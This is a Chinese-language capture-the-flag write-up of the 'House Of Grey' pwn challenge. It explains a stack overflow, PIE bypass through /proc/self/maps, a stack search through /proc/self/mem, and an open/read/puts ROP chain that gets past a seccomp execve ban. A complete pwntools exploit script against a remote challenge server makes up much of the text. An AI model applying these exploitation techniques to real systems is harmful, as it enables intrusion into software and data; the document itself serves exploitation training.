 

# House Of Grey

## 来源

功防世界

## 难度

8 / 10

## 保护

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## 简单描述

该题没有明显的分界点, 涉及的知识也比较陌生,十分经典. 通过创建子进程方式避免被直接调试,且有记时,保护全开,要理解linux下的一些文件.如 /proc/self/下的文件,通过seccomp-tools检验程序, 发现禁用execve函数,只能通过open,read,write获取flag

## vul

```c
void __fastcall fn(void *arg)
{
  unsigned __int64 v1; // rsi
  int fd; // [rsp+10h] [rbp-70h]
  signed int i; // [rsp+14h] [rbp-6Ch]
  int v4; // [rsp+1Ch] [rbp-64h]
  int v5; // [rsp+1Ch] [rbp-64h]
  void *v6; // [rsp+20h] [rbp-60h]
  char buf[24]; //---------------------stack ouverflow
  void *v8; // [rsp+48h] [rbp-38h]
  char nptr; // [rsp+50h] [rbp-30h]
  unsigned __int64 v10; // [rsp+78h] [rbp-8h]
  __int64 savedregs; // [rsp+80h] [rbp+0h]

  v10 = __readfsqword(0x28u);
  puts("You get into my room. Just find something!\n");
  v6 = malloc(100000uLL);
  if ( !v6 )
  {
    perror("malloc");
    exit(1);
  }
  if ( (unsigned int)sub_14D2(100000LL) )
    exit(1);
  v8 = v6;
  for ( i = 0; i <= 29; ++i )
  {
    sub_FEE();
    switch ( (unsigned int)&savedregs )
    {
      case 1u:
        puts("So man, what are you finding?");
       //length 40 can be stack overflow--------
        buf[(signed int)((unsigned __int64)read(0, buf, 40uLL) - 1)] = 0;
        
        if ( (unsigned int)check(buf) )//不能读取flag文件
        {
          puts("Man, don't do it! See you^.");
          exit(1);
        }
        fd = open(buf, 0);
        if ( fd < 0 )
        {
          perror("open");
          exit(1);
        }
        return;
      case 2u: 
        puts("So, Where are you?");
        read(0, &nptr, 0x20uLL);
        v1 = strtoull(&nptr, 0LL, 10);
        lseek(fd, v1, 0); //可以定位fd的地址
        break;
      case 3u:
        puts("How many things do you want to get?");
        read(0, &nptr, 8uLL);
        v4 = atoi(&nptr);
        if ( v4 <= 100000 )
        {
          v5 = read(fd, v8, v4);
          if ( v5 < 0 )
          {
            puts("error read");
            perror("read");
            exit(1);
          }
          puts("You get something:");
          write(1, v8, v5);
        }
        else
        {
          puts("You greedy man!");
        }
        break;
      case 4u:
        puts("What do you want to give me?");
        puts("content: ");
        read(0, v8, 0x200uLL);                  // v8 can be modifyed
        break;
      case 5u:
        exit(0);
        return;
      default:
        continue;
    }
  }
  puts("\nI guess you don't want to say Goodbye!");
  puts("But sadly, bye! Hope you come again!\n");
  exit(0);
}
```

vul: 存在堆栈溢出, 通过覆盖 v8实现任意地址读写

## 知识点

由于可以读取除了flag之外的文件，就可以读取/proc/self/maps文件,Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。

程序最后有一个exit(0)，由此，覆盖fn函数的返回地址来构造ROP不可行，但可以覆盖read函数的返回地址，也就是调用read任意写时，把自己的返回地址给覆盖了,这样ROP写入后就直接开始执行了。为了覆盖read的返回地址，就需要确定栈的地址。

但是，由于程序是clone出来的，第三个参数指定了clone出的进程的栈地址，程序一开始用mmap映射了一段内存，然后取了其中的一个随机的位置传给了clone，由此，并不知道程序的栈地址。但是，可以通过读取/proc/self/mem文件，来搜索标记，已确定程序的栈地址, 注意,堆栈的生长方向是由高地址向低地址生长。

## 思路

1. 如何调试? 使用ida把超时函数的exit给patch掉, 通过gdb attach的方式调试子进程
2. 漏洞 1: 明显的漏洞点就在执行1功能的时候就有字符串溢出, 可以覆盖v8变量通过4功能实现任意地址写入.
3. 漏洞 2: 可以通过输入打开文件为 /proc/self/maps来获取各个基址
4. 绕过PIE，以及利用/proc/self/mem来读取任意地址的内容
5. 通过在/proc/self/mem中搜索'/proc/self/maps'字符串来定位堆栈的地址
6. 计算出read ret地址,构造rop链读取flag

## 利用

###  获取基址

```python
	sla('?', 'y')

	#leaking base addr
	p = '/proc/self/maps'
	fid(p)
	get(1500)

	ru('You get something:\n')
	exe_base = int(r(12), 16)
	ru('[heap]\n')
	stack_start = int(r(12), 16)
	ru('-')
	stack_end =   int(r(12), 16)

	ru('rw-p 00000000 00:00 0 \n')

	libc_base = int(r(12), 16)
	li('exe_base  ' + hex(exe_base))
	li('libc_base ' + hex(libc_base))

	li('stack_start ' + hex(stack_start))
	li('stack_end   ' + hex(stack_end))

	pop_rdi_ret_offset = 0x1823
	pop_rsi_r15_ret_offset = 0x1821
	pop_rdi_ret = exe_base + pop_rdi_ret_offset
	pop_rsi_r15_ret = exe_base + pop_rsi_r15_ret_offset
	open_plt = exe_base + exe.plt['open']
	read_plt = exe_base + exe.plt['read']
	puts_plt = exe_base + exe.plt['puts']
```



### 搜索内存定位read ret地址

接下来，就需要读取/proc/self/mem来搜索内存，确定栈地址了

```c
for ( i = 0; i <= 29; ++i )
  {
    sub_FEE();
 ...
```

通过以上逻辑,程序只可以循环使用30次, 前面使用了4次, ，最后还需要用2次,搜索内存只能使用24次.

而每次最多允许读取100000个字节的数据，由此，能搜索2400000个字节的内容，通过调试，观察数据的栈地址，计算它与stack_end的值的差值，做一个大致的范围,由于栈是从高往低增长的，因此，应该从stack_end – x ~ stack_end搜索

```python
	#position stack addr
	offset = 0xf800000
	li('debug---------------')
	#begin_offset ~ stack_end
	stack_begin_offset = stack_end - offset - 24 * 100000
	li('stack_begin_offset ' + hex(stack_begin_offset))
	li('stack_end   ' +        hex(stack_end))

	fid('/proc/self/mem')
    #打开该时起始地址为0,则偏移直接为stack_begin_offset地址
	loc(stack_begin_offset) #loacate in stack_begin_offset
	# searching
	for i in range(0, 24): #内存搜索'/proc/self/mem'来定位栈地址.
		get(100000)
		text = ru('1.Find something')
		if '/proc/self/mem' in text:
			content = text.split('/proc/self/mem')[0] //若找到, 切割该字符串,获取前面的内容长度.
			break
		if i == 23:
			li('not found')
			exit(0)

	v8_addr = stack_begin_offset + i * 100000 + len(content) - 0x14
	li('v8_addr: ' + hex(v8_addr))

	read_ret = v8_addr - (0x60 - 0x08) + 0x20
	li('read_ret: ' + hex(read_ret))
```

### 构造rop链

在这里,只能通过写入read的 ret地址, 因为只有在刚读取完成之后, 返回的地址才不会被覆盖, 其他函数修改是被覆盖的,没有效果.

```python
p = '/proc/self/mem'.ljust(24, '\x00') + p64(read_ret)
	fid(p) # fd as 5

	#rop
    #64位中 三个参数函数的传参方式
	'''
	read(fd, buf, length)
	1 RDI  0x0  #fd
	2 RSI  0x7fd5ffbc3640 ◂— '/proc/self/mem' #buf
	3 RDX  0x28 #length
	'''
	ret = read_ret
	#open  ./flag
	p = p64(pop_rdi_ret) + p64(ret + 15 * 8)
	p += p64(pop_rsi_r15_ret) + p64(0) + p64(0) + p64(open_plt)

	# read flag to buffer, fd is 6
	p += p64(pop_rdi_ret) + p64(6)
	p += p64(pop_rsi_r15_ret) + p64(ret + 15 * 8) + p64(0) + p64(read_plt)

	# puts flag
	p += p64(pop_rdi_ret) + p64(ret + 15 * 8) + p64(puts_plt)
	# ./flag str will be replace flag{***}
	#p = p64(pop_rdi_ret) + p64()
	p += './flag\x00'
	#db()
	
	giv(p)
```



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "house_of_grey"
libFile  = ""

remoteIp = "111.198.29.45"
remotePort = 44908

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x :  io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def fid(text):
	sla('5.Exit\n', '1')
	sla('?', text)

def loc(offset):
	sla('5.Exit\n', '2')
	sla('?', str(offset))
	
def get(length):
	sla('5.Exit\n', '3')
	sla('?', str(length))

def giv(text):
	sla('5.Exit\n', '4')
	sla('?', text)

def q(text):
	sla('5.Exit\n', '5')

#--------------------------Exploit--------------------------
def exploit():

	sla('?', 'y')

	#leaking base addr
	p = '/proc/self/maps'
	fid(p)
	get(1500)

	ru('You get something:\n')
	exe_base = int(r(12), 16)
	ru('[heap]\n')
	stack_start = int(r(12), 16)
	ru('-')
	stack_end =   int(r(12), 16)

	ru('rw-p 00000000 00:00 0 \n')

	libc_base = int(r(12), 16)
	li('exe_base  ' + hex(exe_base))
	li('libc_base ' + hex(libc_base))

	li('stack_start ' + hex(stack_start))
	li('stack_end   ' + hex(stack_end))

	pop_rdi_ret_offset = 0x1823
	pop_rsi_r15_ret_offset = 0x1821
	pop_rdi_ret = exe_base + pop_rdi_ret_offset
	pop_rsi_r15_ret = exe_base + pop_rsi_r15_ret_offset
	open_plt = exe_base + exe.plt['open']
	read_plt = exe_base + exe.plt['read']
	puts_plt = exe_base + exe.plt['puts']

	#position stack addr
	offset = 0xf800000
	li('debug---------------')
	#begin_offset ~ stack_end
	stack_begin_offset = stack_end - offset - 24 * 100000
	li('stack_begin_offset ' + hex(stack_begin_offset))
	li('stack_end   ' +        hex(stack_end))

	fid('/proc/self/mem')
	loc(stack_begin_offset)
	# searching
	for i in range(0, 24):
		get(100000)
		text = ru('1.Find something')
		if '/proc/self/mem' in text:
			content = text.split('/proc/self/mem')[0]
			break
		if i == 23:
			li('not found')
			exit(0)


	v8_addr = stack_begin_offset + i * 100000 + len(content) - 0x14
	li('v8_addr: ' + hex(v8_addr))

	read_ret = v8_addr - (0x60 - 0x08) + 0x20
	li('read_ret: ' + hex(read_ret))
	p = '/proc/self/mem'.ljust(24, '\x00') + p64(read_ret)
	fid(p) # fd as 5

	#rop
	'''
	3 RDX  0x28 #length
	1 RDI  0x0  #fd
	2 RSI  0x7fd5ffbc3640 ◂— '/proc/self/mem' #buffer
	'''

	ret = read_ret
	#open  ./flag
	p = p64(pop_rdi_ret) + p64(ret + 15 * 8)
	p += p64(pop_rsi_r15_ret) + p64(0) + p64(0) + p64(open_plt)

	# read flag to buffer, fd is 6
	p += p64(pop_rdi_ret) + p64(6)
	p += p64(pop_rsi_r15_ret) + p64(ret + 15 * 8) + p64(0) + p64(read_plt)

	# puts flag
	p += p64(pop_rdi_ret) + p64(ret + 15 * 8) + p64(puts_plt)
	# ./flag str will be replace flag{***}
	#p = p64(pop_rdi_ret) + p64()
	p += './flag\x00'
	#db()
	
	giv(p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
    
```











